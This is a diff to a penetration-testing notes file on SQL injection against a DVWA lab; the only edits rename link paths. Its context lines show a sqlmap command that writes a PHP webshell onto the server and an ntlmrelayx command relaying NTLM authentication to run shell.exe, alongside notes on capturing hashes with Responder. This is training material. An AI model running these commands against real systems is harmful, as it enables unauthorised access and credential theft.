@@ -12,7 +12,7 @@ Search Tag(s): #sql-injection #sqlmap #initial-foothold #persistence #webshell #
 
 ### 5.1.2 - Upload a specific Webshell
 
-Refer to this [[Tactics && Techniques && Procedures (TTPs) Phases/B - Initial Access/Callback Shells/Webshells/Webshells|link]] to generate interactive weevely webshells and click [[Command and Control/Webshells/Weevely/01 - Help Menu|here]] for post exploitation section.
+Refer to this [[Tactics && Techniques && Procedures (TTPs) Phases/C - Initial Access/Callback Shells/Webshells/Webshells|link]] to generate interactive weevely webshells and click [[Command and Control/Webshells/Weevely/01 - Help Menu|here]] for post exploitation section.
 
 ```
 $ sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie "PHPSESSID=<PHP_cookie_session_ID>;security=low" --random-agent --file-write="/path/to/webshell.php" --file-dest="/var/www/html/dvwa/shell.php"
@@ -148,7 +148,7 @@ TODO: Test this and place it where it's appropriate
 
 #### 5.3.1.2 - Grab NTLM Hashes via SMB Authentication Relay
 
-- Run [[Tactics && Techniques && Procedures (TTPs) Phases/B - Initial Access/Sniffing and Spoofing/Passive/Responder|Responder]] to grab the NTLM hashes. This also can be done with [[Tactics && Techniques && Procedures (TTPs) Phases/B - Initial Access/Sniffing and Spoofing/Active/Metasploit#^0c8cfd|metasploit SMB relay auxiliary module]] including [[Tactics && Techniques && Procedures (TTPs) Phases/B - Initial Access/Sniffing and Spoofing/Active/Impacket/Impacket|ntlmrelayx]].
+- Run [[Tactics && Techniques && Procedures (TTPs) Phases/C - Initial Access/Sniffing and Spoofing/Passive/Responder|Responder]] to grab the NTLM hashes. This also can be done with [[Tactics && Techniques && Procedures (TTPs) Phases/C - Initial Access/Sniffing and Spoofing/Active/Metasploit#^0c8cfd|metasploit SMB relay auxiliary module]] including [[Tactics && Techniques && Procedures (TTPs) Phases/C - Initial Access/Sniffing and Spoofing/Active/Impacket/Impacket|ntlmrelayx]].
 
 - Responder
 
@@ -188,7 +188,7 @@ $ sudo sqlmap -u "http://dvwa.local/dvwa/vulnerabilities/sqli/?id=1&Submit=Submi
 
 ##### 5.3.2.2.2 - Manual
 
-- Repeat the [[05 - Initial Foothold|previous step]] and launch [[Tactics && Techniques && Procedures (TTPs) Phases/B - Initial Access/Sniffing and Spoofing/Active/Impacket/Impacket|ntlmrelayx]] and/or [[02 - Responder|Responder]] to receive a callback shell connection. This can be done with [[Tactics && Techniques && Procedures (TTPs) Phases/B - Initial Access/Sniffing and Spoofing/Active/Metasploit#^c109ec|metasploit SMB relay exploit module]].
+- Repeat the [[05 - Initial Foothold|previous step]] and launch [[Tactics && Techniques && Procedures (TTPs) Phases/C - Initial Access/Sniffing and Spoofing/Active/Impacket/Impacket|ntlmrelayx]] and/or [[02 - Responder|Responder]] to receive a callback shell connection. This can be done with [[Tactics && Techniques && Procedures (TTPs) Phases/C - Initial Access/Sniffing and Spoofing/Active/Metasploit#^c109ec|metasploit SMB relay exploit module]].
 
 ```
 $ sudo impacket-ntlmrelayx -t smb://<target_IP> -smb2support -e shell.exe
